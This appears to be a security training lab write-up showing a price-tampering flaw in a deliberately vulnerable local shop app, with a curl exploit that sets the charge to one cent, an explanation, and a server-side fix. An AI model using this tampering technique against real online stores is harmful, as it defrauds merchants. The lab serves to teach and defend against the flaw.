# Lab 06: Price tampering at checkout

The checkout form sends the amount to charge. The server trusts it: `amount_cents` becomes the order total, so a keyboard costs one cent.

**OWASP Top 10:2025:** [A06 Insecure Design](https://owasp.org/Top10/2025/)

**Code:** `routes/orders.js` (`/checkout`), `views/checkout.ejs`, `model/db.js` (`createOrder`)

## Exploit

Log in as alice and order product 1 (129.00 €) for 0.01 €:

```bash
curl -s -b cookies.txt -X POST http://localhost:8888/checkout \
  --data "product_id=1" \
  --data "product_name=Mechanical Keyboard MK-ULTRA" \
  --data "quantity=1" \
  --data "amount_cents=1" \
  --data "address=1 Main Street" \
  --data "card_number=4242 4242 4242 4242" \
  --data "cvv=123"
# Order #N confirmed — charged 0.01 €
```

Or do it from the browser: open **Checkout**, change "Amount (cents)" to `1`, press Pay.

The order list shows `0.01 €` — the app undercharged and stored the tampered price as truth.

## Why it happens

The *client* decides money. Price, name, quantity, and even the product id travel through attacker-controlled fields, and the server neither recomputes nor verifies.

## Fix

Recompute everything server-side; accept only identifiers:

```js
// routes/orders.js
const productId = parseInt(req.body.product_id, 10);
const qty = Math.max(1, parseInt(req.body.quantity, 10) || 1);
const { rows } = await db.pool.query("SELECT name, price_cents FROM products WHERE id = $1", [productId]);
if (rows.length === 0) return res.status(400).render("error", { message: "Unknown product", error: {} });
const amount = rows[0].price_cents * qty;   // server math, not client math
```

Never render prices into forms; never trust `amount`, `price`, `discount`, or `currency` fields from the client — including on payment-provider callbacks (verify signature, verify amount).

## Verify

After the fix, sending `amount_cents=1` still charges 129.00 €.

Related: the same form has no CSRF token — see lab 06b.